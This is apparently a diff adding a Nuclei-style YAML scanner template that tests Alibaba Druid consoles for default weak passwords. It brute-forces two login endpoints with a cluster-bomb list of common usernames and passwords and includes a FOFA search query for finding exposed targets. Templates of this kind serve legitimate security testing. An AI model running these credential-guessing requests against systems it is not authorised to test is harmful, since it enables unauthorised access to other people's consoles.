@@ -1,0 +1,77 @@
+id: druid-default-login
+
+info:
+  name: Druid控制台弱口令检测
+  author: security researcher
+  severity: high
+  description: 检测Druid控制台是否存在默认弱口令漏洞，并输出成功的账号密码组合
+  metadata:
+    fofa-query: title="Druid Stat Index"
+  tags: druid, weakpass, console, login
+
+http:
+  - raw:
+      - |
+        POST /druid/submitLogin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+        Referer: {{BaseURL}}/druid/index.html
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+
+        loginUsername={{username}}&loginPassword={{password}}
+
+    attack: clusterbomb
+    payloads:
+      username:
+        - "admin"
+        - "druid"
+        - "ruoyi"
+        - "ry"
+      password:
+        - "123456"
+        - "admin"
+        - "druid"
+        - "druid123456"
+        - "admin123"
+        - "admin888"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'body == "success"'
+        condition: and
+
+  - raw:
+      - |
+        POST /druid/login.html HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+        Referer: {{BaseURL}}/druid/login.html
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+
+        loginUsername={{username}}&loginPassword={{password}}
+
+    attack: clusterbomb
+    payloads:
+      username:
+        - "admin"
+        - "druid"
+        - "ruoyi"
+        - "ry"
+      password:
+        - "123456"
+        - "admin"
+        - "druid"
+        - "druid123456"
+        - "admin123"
+        - "admin888"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'body == "success"'
+        condition: and
